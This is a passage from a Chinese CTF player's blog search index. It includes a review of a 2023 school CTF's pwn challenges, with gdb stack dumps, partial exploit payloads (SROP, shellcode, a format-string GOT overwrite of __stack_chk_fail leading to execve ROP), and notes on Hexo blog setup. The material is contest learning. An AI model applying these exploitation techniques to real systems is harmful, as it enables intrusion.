—▸ 0x404248 ◂— 0x4bfd4803:0018│     0x404248 ◂— 0x4bfd4804:0020│     0x404250 ◂— 0x705:0028│     0x404258 ◂— 0x006:0030│     0x404260 ◂— 0x007:0038│     0x404268 —▸ 0x404010 (_GLOBAL_OFFSET_TABLE_+16) —▸ 0x7fdc33f7fd30 (_dl_runtime_resolve_xsavec) ◂— endbr64 08:0040│     0x404270 ◂— 0x68732f6e69622f /* &#39;/bin/sh&#39; */09:0048│     0x404278 ◂— &#39;BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB0B@&#39;... ↓        3 skipped0d:0068│     0x404298 —▸ 0x404230 ◂— 0xfffffffffff442d00e:0070│     0x4042a0 —▸ 0x404260 ◂— 0x00f:0078│     0x4042a8 ◂— &#39;CCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCC8B@&#39;... ↓        15 skipped1f:00f8│     0x404328 —▸ 0x404238 ◂— 0x0</code></pre><ul><li>貌似可以当个板子用</li><li>为啥是0x68没懂</li><li>不懂的再看看这：<a href="https://blog.csdn.net/qq_51868336/article/details/114644569">https://blog.csdn.net/qq_51868336/article/details/114644569</a> 和wiki</li></ul></li></ul><h4 id="3-3-FULLRELRO"><a href="#3-3-FULLRELRO" class="headerlink" title="3.3 FULLRELRO"></a>3.3 FULLRELRO</h4><ul><li>wiki上还有FULLRELRO的呢 先鸽了</li></ul>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>2023校赛总结</title>
    <link href="/2023/11/30/2023%E6%A0%A1%E8%B5%9B%E6%80%BB%E7%BB%93/"/>
    <url>/2023/11/30/2023%E6%A0%A1%E8%B5%9B%E6%80%BB%E7%BB%93/</url>
    
    <content type="html"><![CDATA[<h3 id="0-前言"><a href="#0-前言" class="headerlink" title="0 前言"></a>0 前言</h3><ul><li>我是什么垃圾 出题给大佬做（瑟瑟发抖</li><li>大概就记录一下审WP过程中佬们的非预期和发现的题中的一些问题</li></ul><h3 id="1-signin"><a href="#1-signin" class="headerlink" title="1 signin"></a>1 signin</h3><ul><li><p>这题还有非预期我是没想到的 菜狗哭泣（当时出的时候也没多想 就按磐石那个出的来着</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> __cdecl <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">const</span> <span class="hljs-type">char</span> **argv, <span class="hljs-type">const</span> <span class="hljs-type">char</span> **envp)</span><br>&#123;<br>  __int64 v4[<span class="hljs-number">2</span>]; <span class="hljs-comment">// [rsp+0h] [rbp-10h] BYREF</span><br><br>  v4[<span class="hljs-number">1</span>] = __readfsqword(<span class="hljs-number">0x28</span>u);<br>  put(argc, argv, envp);<br>  __isoc99_scanf(<span class="hljs-string">&quot;%ld&quot;</span>, v4);<br>  <span class="hljs-keyword">if</span> ( v4[<span class="hljs-number">0</span>] &gt; <span class="hljs-number">3</span> )<br>    <span class="hljs-built_in">exit</span>(<span class="hljs-number">-1</span>);<br>  <span class="hljs-keyword">if</span> ( LODWORD(v4[<span class="hljs-number">0</span>]) == B )<br>    b4ckdo0r();<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>只要符号位为1 低32位为0x42就行 至于高32位的数值位为多少都行</p></li><li><p>然后关于如何发送的问题</p><blockquote><p>但是这里读入用的是scanf，所以必须以字符串或者bytes的形式输入数字(X1ngCHEN师傅)</p></blockquote><p>p64是不行的 但我查了查p64就是将整数转换成字节啊？（不过我好像用p64只会是地址</p></li><li><p>patchelf还可以这样写(X1ngCHEN师傅)</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">patchelf --set-interpreter /home/akyuu/glibc-all-in-one/libs/2.23-0ubuntu3_amd64/ld-2.23.so --replace-needed libc.so.6 /home/akyuu/glibc-all-in-one/libs/2.23-0ubuntu3_amd64/libc.so.6 pwn<br></code></pre></td></tr></table></figure></li></ul><h3 id="2-EZest"><a href="#2-EZest" class="headerlink" title="2 EZest"></a>2 EZest</h3><ul><li><p>有的师傅只写了一个SigFrame<br>用<code>pop_rbp_ret</code>写&#x2F;bin&#x2F;sh</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs python"> <span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x10</span> + p64(pop_rbp_ret) + p64(bss - <span class="hljs-number">0x10</span>) + p64(<span class="hljs-number">0x40110e</span>)<br>    <br>.text:000000000040110E <span class="hljs-number">48</span> C7 C0 <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span>          mov     rax, <span class="hljs-number">0</span><br>.text:0000000000401115 <span class="hljs-number">48</span> C7 C7 <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span>          mov     rdi, <span class="hljs-number">0</span>                          ; fd<br>.text:000000000040111C <span class="hljs-number">48</span> 8D <span class="hljs-number">75</span> F0                   lea     rsi, [rbp+buf]                  ; buf<br>.text:0000000000401120 <span class="hljs-number">48</span> C7 C2 <span class="hljs-number">00</span> 02 <span class="hljs-number">00</span> <span class="hljs-number">00</span>          mov     rdx, 200h                       ; count<br>.text:0000000000401127 0F 05                         syscall                                 ; LINUX - sys_read<br>.text:0000000000401129 C3                            retn<br>.text:0000000000401129<br>.text:0000000000401129                               main endp ; sp-analysis failed<br></code></pre></td></tr></table></figure></li><li><p>不过本来也是板子题</p></li></ul><h3 id="3-magicode"><a href="#3-magicode" class="headerlink" title="3 magicode"></a>3 magicode</h3><ul><li><p>这题可能出的还可以？？（小心翼翼 还好当时没有把这么丑的代码改掉😏 不然师傅们就觉得贼简单了</p></li><li><p>但这题之前说过 保护那里应该可以怎么弄不显示rwx段（FSCTF那</p></li><li><p>Ephemeral1y师傅真的强 手打shellcode来着<br>pANz0e师傅add(-10)也是可以的</p></li><li><p>还有Whhxy4师傅提到了绕过canary的问题</p><blockquote><p>alloca在汇编⾥⾯的效果是add rsp，rdx</p><p>也就是1是分配⼀个栈根据rbp的位置往下减，输⼊0就是在rbp-0x10的位置开始以此类推 ，这题有</p><p>canary所以输⼊0正好跳过canary </p><hr><p>emmm 我仔细看了一下 首先是sub rsp, rdx 然后是根据rsp的位置往下减，确实和canary无关 rbp的位置是固定的</p></blockquote><p>X1ngCHEN师傅说有爆破？ 啊出题和做题还是有些不同的 完全没考虑到<br>试了试X1ingCHEN师傅的exp，其实也并不用爆破 ，好像最后<code>\x10</code>完全没用到 每一次都能getshell的 </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">payload = <span class="hljs-string">b&#x27;a&#x27;</span>*(<span class="hljs-number">0x70</span>) + shellcode.ljust(<span class="hljs-number">0x50</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>)+<span class="hljs-string">b&#x27;\x10&#x27;</span><br></code></pre></td></tr></table></figure><p>嗯嗯 确实 magic函数的实现为</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs asm">.text:0000000000001568 48 8B 45 E0                   mov     rax, [rbp+var_20]# 这个var_20我gdb看好像就是固定为0x20 然后这个位置存放的就是shellcode的起始位置<br>.text:000000000000156C FF D0                         call    rax<br></code></pre></td></tr></table></figure></li><li><p>好好好 alloca函数是为了对齐并且多0x10(可能是为了安全) 就是如果为alloca(0x60) 实际分配的是0x70 如果是alloca(0x64) 分配的也是0x70</p></li><li><p>gdb应该是能看到的会多分配0x10 alloca在汇编上的效果是<code>sub    rsp, rdx</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_"># </span><span class="language-bash">这是执行完sub rsp, rdx以后 size输入的是0x20</span><br>0x555555555496 &lt;main+311&gt;    sub    rsp, rdx<br> ► 0x555555555499 &lt;main+314&gt;    mov    rdx, rax<br>   0x55555555549c &lt;main+317&gt;    and    edx, 0xfff<br>   0x5555555554a2 &lt;main+323&gt;    test   rdx, rdx<br>   0x5555555554a5 &lt;main+326&gt;    je     main+344                &lt;main+344&gt;<br> <br>   0x5555555554a7 &lt;main+328&gt;    and    eax, 0xfff<br>   0x5555555554ac &lt;main+333&gt;    sub    rax, 8<br>──────────────────────────────────────────────────────────────────────────────────────────────────────────────[ STACK ]───────────────────────────────────────────────────────────────────────────────────────────────────────────────<br>00:0000│ rsp 0x7fffffffdd10 ◂— 0xa3233 /* &#x27;32\n&#x27; */# alloca(0x20)以后rsp的位置<br>01:0008│     0x7fffffffdd18 ◂— 0x0<br>02:0010│     0x7fffffffdd20 —▸ 0x7fffffffdf18 —▸ 0x7fffffffe278 ◂— &#x27;/home/yech0/sskd/hectf2023/2magicode/magicode&#x27;zhe<br>03:0018│     0x7fffffffdd28 ◂— 0xe4c8453177346a00<br>04:0020│     0x7fffffffdd30 —▸ 0x7fffffffde00 ◂— 0x1<br>05:0028│     0x7fffffffdd38 —▸ 0x55555555543d (main+222) ◂— mov dword ptr [rbp - 0x2c], eax<br>06:0030│     0x7fffffffdd40 —▸ 0x555555558020 (stdout@GLIBC_2.2.5) —▸ 0x7ffff7e1a780 (_IO_2_1_stdout_) ◂— 0xfbad2887# rsp原先的位置<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">我这里gdb是如何实现多0x10的:(size输入0x20以后</span><br>   0x555555555445 &lt;main+230&gt;    lea    rdx, [rax + 8]rdx:0x28<br>   0x555555555449 &lt;main+234&gt;    mov    eax, 0x10    rax:0x10<br>   0x55555555544e &lt;main+239&gt;    sub    rax, 1    rax:0xf<br>   0x555555555452 &lt;main+243&gt;    add    rax, rdxrax:0x37<br>   0x555555555455 &lt;main+246&gt;    mov    esi, 0x10<br>   0x55555555545a &lt;main+251&gt;    mov    edx, 0<br>   0x55555555545f &lt;main+256&gt;    div    rsirax:0x3rd:0x7<br>   0x555555555462 &lt;main+259&gt;    imul   rax, rax, 0x10 rax:0x30<br></code></pre></td></tr></table></figure></li></ul><h3 id="4-fmt"><a href="#4-fmt" class="headerlink" title="4 fmt"></a>4 fmt</h3><ul><li><p>好好好 没有师傅用预期方法 菜狗爆哭 师傅们都太强了 </p></li><li><p>我都不道会有stack_chk_fail的利用 那其实能利用多次的话就完全不用给后门了 师傅们好像也没用（555555 有一个（蔚蓝师傅用了fini_array pANz0e师傅用了fini_array没有泄露libc 又改stack_chk_fail泄露然后利用后门</p></li><li><blockquote><p>读了题目都知道是格式化字符串漏洞了，但是正常情况下只能使用一次，这显然是无法让我们拿到shell的。</p><p>刚开始往格式化字符串泄露canary然后构造ROP的办法来想的，但是意识到第一步获得了canary又能干什么呢？啥都干不了，就exit了。所以我们不能这么平庸地看问题。</p><p>考虑到绕过Canary，不如与其正面硬刚，直接让Canary失效。</p><p>众所周知，如果程序检测到Canary被更改了，那么就会在函数结束的时候调用<strong>stk_chk_fail</strong>这个函数，然后就退出了。但是我们正是可以利用这一点，用格式化字符串更改stk_chk_fail的got表地址为main函数地址，那么就可以构造较长的payload来修改Canary从而可以无限次调用main函数，也是可以通过较短的payload不修改Canary来达到不接着调用</p><p>函数直接ret的效果。</p><p>既然可以控制main函数的执行了，那么我们也就可以控制格式化字符串漏洞的利用了。</p><p>于是我们这样利用漏洞：</p><p>1.第一次格式化字符串漏洞：修改__stk_chk_fail函数的got表地址为main函数地址。</p><p>2.第二次格式化字符串漏洞：获取栈上面__libc_start_main+128的地址。</p><p>3.第三次格式化字符串漏洞：构建并且输入ROP，但是这里payload的长度肯定会覆盖Canary，因此我们这里一定会进入下一层main函数，但是在下一层main函数我们随便传一个短短的字符串就行了，就可以不修改Canary从而达到退出执行上一层main函数输入的ROP的效果。</p><p>这里输入用的是scanf，遇到0d会截断，亲测system似乎打不通（我只试了本地，远程不知道），反正都有libc基址了，啥gedgets就都有了，而且ROP空间充足那么我们倒不如直接调用成功率更大的execve（X1ngCHEN师傅</p></blockquote><p>然后这里还有个问题就是高版本rop的话没有pop_rdi_ret的这种gadget 于是师傅们用了libc里的<br>上面还说到system打不通 有的师傅用了execve 有的用的onegaget</p></li><li><p>magicode和这题enllus1on师傅都拿了一血 magicode不用多说 应该是做过fcalc那个题 这个题写的exp看不懂（最强双非22级是吧 瑟瑟发抖</p></li><li><p>sublime text ctrl shif L多行编辑</p></li></ul><h3 id="5-风水小狮"><a href="#5-风水小狮" class="headerlink" title="5 风水小狮"></a>5 风水小狮</h3><ul><li>emmmm 这个应该没啥注意的 都是预期解</li></ul><h3 id="6-风水中狮"><a href="#6-风水中狮" class="headerlink" title="6 风水中狮"></a>6 风水中狮</h3><ul><li>又是enllus1on师傅 唯一解 真的强 %50$p和 %51%p都是flag的地址</li><li>沃趣 好像给的解释错了 给师傅们磕一个</li></ul><h3 id="7-风水大狮"><a href="#7-风水大狮" class="headerlink" title="7 风水大狮"></a>7 风水大狮</h3><ul><li>好家伙 田总说加载沙箱的代码忘写了 非预期了 没有绕沙箱也能做的 好家伙 除了Ephemeral1y师傅用了看不懂的链子<br>怪我怪我 没审好题</li><li>如果有沙箱的话 就得绕 但还没看懂</li></ul><h3 id="8-easyweb"><a href="#8-easyweb" class="headerlink" title="8 easyweb"></a>8 easyweb</h3><ul><li>就X1ngCHEN师傅的唯一解呢 预期解 看看就欧克</li></ul>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>hexo+github博客搭建</title>
    <link href="/2023/09/08/hexo+github%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA/"/>
    <url>/2023/09/08/hexo+github%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA/</url>
    
    <content type="html"><![CDATA[<ul><li><p>贴一下参考链接</p><blockquote><p><a href="https://blog.csdn.net/weixin_45019350/article/details/121901433">https://blog.csdn.net/weixin_45019350/article/details/121901433</a></p><p><a href="https://zhuanlan.zhihu.com/p/60578464">https://zhuanlan.zhihu.com/p/60578464</a></p></blockquote></li><li><p>主题用的是<code>fluid</code></p><p>主题更换参考链接</p><blockquote><p><a href="https://blog.csdn.net/weixin_51545953/article/details/128499341">https://blog.csdn.net/weixin_51545953/article/details/128499341</a></p><p><a href="https://blog.csdn.net/weixin_49270402/article/details/117672195">https://blog.csdn.net/weixin_49270402/article/details/117672195</a> 里面的小彩蛋有图片网站(good)</p></blockquote></li><li><p>以管理员身份进入终端</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs shell">切换到`d盘myblog`下<br>d:<br>cd my blog<br><br>修改配置信息<br><br>hexo clean<br>hexo g<br>hexo s# 就可以生成静态的页面，预览效果<br>hexo d# 部署到github上 可能会出现错误 多试几次就好<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">出现这些提示信息就部署上去了</span><br>Delta compression using up to 8 threads<br>Compressing objects: 100% (53/53), done.<br>Writing objects: 100% (81/81), 5.03 MiB | 628.00 KiB/s, done.<br>Total 81 (delta 33), reused 0 (delta 0), pack-reused 0<br>remote: Resolving deltas: 100% (33/33), completed with 7 local objects.<br>To https://github.com/yech0/yech0.github.io<br>   6165f62..b080b14  HEAD -&gt; master<br>Branch &#x27;master&#x27; set up to track remote branch &#x27;master&#x27; from &#x27;https://github.com/yech0/yech0.github.io&#x27;.<br>[32mINFO [39m Deploy done: [35mgit[39m<br></code></pre></td></tr></table></figure></li><li><p>还有个问题就是背景图片加载太慢了 我已经尽量压缩了 但还是慢（就图片慢 其他的效果很快的</p><p><del>会不会换个源会好一点？下次试试</del></p><p>用Google打开会快一点 火狐比较慢，</p></li></ul>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>Hello World</title>
    <link href="/2023/08/24/hello-world/"/>
    <url>/2023/08/24/hello-world/</url>
    
    <content type="html"><![CDATA[<p>你发现了我<code>(*^_^*)</code></p>]]></content>
    
    
    
  </entry>
  
  
  
  
</search>
